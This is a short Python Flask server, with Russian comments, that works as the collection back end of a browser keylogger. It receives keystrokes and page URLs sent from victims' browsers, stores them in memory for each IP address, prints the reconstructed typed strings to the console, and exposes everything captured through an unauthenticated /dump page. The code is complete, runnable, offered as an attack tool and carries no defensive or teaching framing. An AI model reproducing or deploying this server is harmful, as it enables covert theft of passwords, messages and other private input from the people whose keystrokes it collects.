from flask import Flask, request, jsonify
from collections import defaultdict
import datetime

app = Flask(__name__)

# ANSI escape
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"
PURPLE = "\033[95m"
keylogs = defaultdict(list)

@app.route("/keylog", methods=["POST"])
def keylog():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "bad json"}), 400

    ip = request.remote_addr
    ts = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    key = data.get("key", "")
    url = data.get("url", "")
    timestamp = data.get("timestamp", ts)

    # Добавляем в память
    keylogs[ip].append({
        "key": key,
        "url": url,
        "timestamp": timestamp
    })

    current = "".join(e["key"] for e in keylogs[ip])
    print(f"[{YELLOW}RESULT STRING{RESET}] {GREEN}{current}{RESET}")

    print(f"{PURPLE}[{ip}] {url} PRESS KEY - {key}{RESET}")

    return jsonify({"status": "ok"})


@app.route("/dump", methods=["GET"])
def dump():
    """Сливает все накопленные данные в читаемом виде"""
    out = []
    for ip, events in keylogs.items():
        line = f"\n=== {ip} ===\n"
        for e in events:
            k = e['key']
            if k == "Enter":
                k = "⏎"
            elif k == "Backspace":
                k = "⌫"
            line += k
        out.append(line)
    return "<pre>" + "\n".join(out) + "</pre>"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)